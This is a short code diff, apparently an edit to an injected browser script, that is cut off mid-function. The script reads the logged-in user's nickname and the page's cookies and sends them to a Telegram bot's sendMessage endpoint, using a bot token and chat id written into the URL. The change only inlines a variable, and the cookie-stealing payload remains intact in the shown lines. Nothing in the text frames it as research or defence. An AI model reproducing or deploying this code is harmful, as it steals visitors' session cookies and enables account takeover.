@@ -1,8 +1,7 @@
 try {
 alert("1")
-let nickname = document.querySelector('[href="#login-box"]').textContent.trim();
   let url = 'https://api.telegram.org/bot7722356869:AAHUB4XLWf5nsTmW8ot8DyrTyytuevIFccU/sendMessage?chat_id=7047469171&text=' + JSON.stringify([{
-  name: nickname,
+  name: document.querySelector('[href="#login-box"]').textContent.trim(),
   cookies: document.cookie
 }]);
 
